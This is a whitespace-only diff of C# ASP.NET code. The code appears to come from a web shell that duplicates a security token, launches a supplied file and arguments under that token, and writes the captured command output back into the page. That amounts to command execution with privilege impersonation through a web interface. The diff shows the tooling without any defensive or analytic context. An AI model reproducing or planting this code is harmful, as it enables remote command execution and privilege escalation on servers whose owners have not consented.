@@ -272,63 +272,63 @@
 			return;
 		}
 
-	    uint dwTokenRights = 395U;
-	    IntPtr hPrimaryToken = IntPtr.Zero;
-	    SECURITY_ATTRIBUTES securityAttr = new SECURITY_ATTRIBUTES();
-	    STARTUPINFO si = new STARTUPINFO();
-	    PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
-	    SECURITY_ATTRIBUTES saAttr = new SECURITY_ATTRIBUTES();
-	    saAttr.nLength = Marshal.SizeOf(typeof(SECURITY_ATTRIBUTES));
-	    saAttr.bInheritHandle = 0x1;
-	    saAttr.lpSecurityDescriptor = IntPtr.Zero;
+		uint dwTokenRights = 395U;
+		IntPtr hPrimaryToken = IntPtr.Zero;
+		SECURITY_ATTRIBUTES securityAttr = new SECURITY_ATTRIBUTES();
+		STARTUPINFO si = new STARTUPINFO();
+		PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+		SECURITY_ATTRIBUTES saAttr = new SECURITY_ATTRIBUTES();
+		saAttr.nLength = Marshal.SizeOf(typeof(SECURITY_ATTRIBUTES));
+		saAttr.bInheritHandle = 0x1;
+		saAttr.lpSecurityDescriptor = IntPtr.Zero;
 
-	    IntPtr out_read = IntPtr.Zero;
-	    IntPtr out_write = IntPtr.Zero;
-	    IntPtr err_read = IntPtr.Zero;
-	    IntPtr err_write = IntPtr.Zero;
+		IntPtr out_read = IntPtr.Zero;
+		IntPtr out_write = IntPtr.Zero;
+		IntPtr err_read = IntPtr.Zero;
+		IntPtr err_write = IntPtr.Zero;
 
 		CreatePipe(ref out_read, ref out_write, ref saAttr, 0);
-	    CreatePipe(ref err_read, ref err_write, ref saAttr, 0);
+		CreatePipe(ref err_read, ref err_write, ref saAttr, 0);
 		SetHandleInformation(out_read, HANDLE_FLAG_INHERIT, 0);
-	    SetHandleInformation(err_read, HANDLE_FLAG_INHERIT, 0);
+		SetHandleInformation(err_read, HANDLE_FLAG_INHERIT, 0);
 
-	    si.cb = Marshal.SizeOf(typeof(STARTUPINFO));
-	    si.hStdOutput = out_write;
-	    si.hStdError = err_write;
-	    si.dwFlags |= 0x00000100;
+		si.cb = Marshal.SizeOf(typeof(STARTUPINFO));
+		si.hStdOutput = out_write;
+		si.hStdError = err_write;
+		si.dwFlags |= 0x00000100;
 
-	    if (!DuplicateTokenEx(token, dwTokenRights, ref securityAttr, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TOKEN_TYPE.TokenPrimary, out hPrimaryToken))
-	    {
+		if (!DuplicateTokenEx(token, dwTokenRights, ref securityAttr, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TOKEN_TYPE.TokenPrimary, out hPrimaryToken))
+		{
 			Response.Write("Call to DuplicateTokenEx failed.");
 			return;
-	    }
+		}
 
 		if (!CreateAsUser(hPrimaryToken, file, String.Concat(" ", args), IntPtr.Zero, IntPtr.Zero, true, CreationFlags.NoConsole, IntPtr.Zero, Path.GetDirectoryName(file), si, pi))
-	    {	      
-	        if (!CreateWithToken(hPrimaryToken, 0, file, String.Concat(" ", args), CreationFlags.NoConsole, IntPtr.Zero, Path.GetDirectoryName(file), si, pi))
-		    {		
-		    	Response.Write("Error: " + Marshal.GetLastWin32Error());
+		{	      
+			if (!CreateWithToken(hPrimaryToken, 0, file, String.Concat(" ", args), CreationFlags.NoConsole, IntPtr.Zero, Path.GetDirectoryName(file), si, pi))
+			{		
+				Response.Write("Error: " + Marshal.GetLastWin32Error());
 				CloseHandle(hPrimaryToken);
-		    	return;
-		    }
-	    }
+				return;
+			}
+		}
 
-	    CloseHandle(out_write);
-	    CloseHandle(err_write);
+		CloseHandle(out_write);
+		CloseHandle(err_write);
 
-	    byte[] buf = new byte[4096];
-	    int dwRead = 0;
-	    string final = "";
-	    while (true)
-	    {
-	        bool bSuccess = ReadFile(out_read, buf, 4096, ref dwRead, IntPtr.Zero);
-	        if (!bSuccess || dwRead == 0)
-	            break;
-	        final += System.Text.Encoding.Default.GetString(buf);
-	        buf = new byte[4096];
-	    }
+		byte[] buf = new byte[4096];
+		int dwRead = 0;
+		string final = "";
+		while (true)
+		{
+			bool bSuccess = ReadFile(out_read, buf, 4096, ref dwRead, IntPtr.Zero);
+			if (!bSuccess || dwRead == 0)
+				break;
+			final += System.Text.Encoding.Default.GetString(buf);
+			buf = new byte[4096];
+		}
 
-	    ResponseArea.InnerText = Regex.Replace(final,  @"[^\P{C}\n]+", "", RegexOptions.None);;
+		ResponseArea.InnerText = Regex.Replace(final,  @"[^\P{C}\n]+", "", RegexOptions.None);;
 
 		CloseHandle(out_read);
 		CloseHandle(err_read);
@@ -337,8 +337,8 @@
 
     public bool CreateAsUser(IntPtr hPrimaryToken, string file, string args, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, CreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, STARTUPINFO si, PROCESS_INFORMATION pi)
     {
-        bool retVal;
-		IntPtr htok = IntPtr.Zero;
+    	bool retVal;
+    	IntPtr htok = IntPtr.Zero;
 		retVal = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok);
 
 		TokPriv1Luid tp;
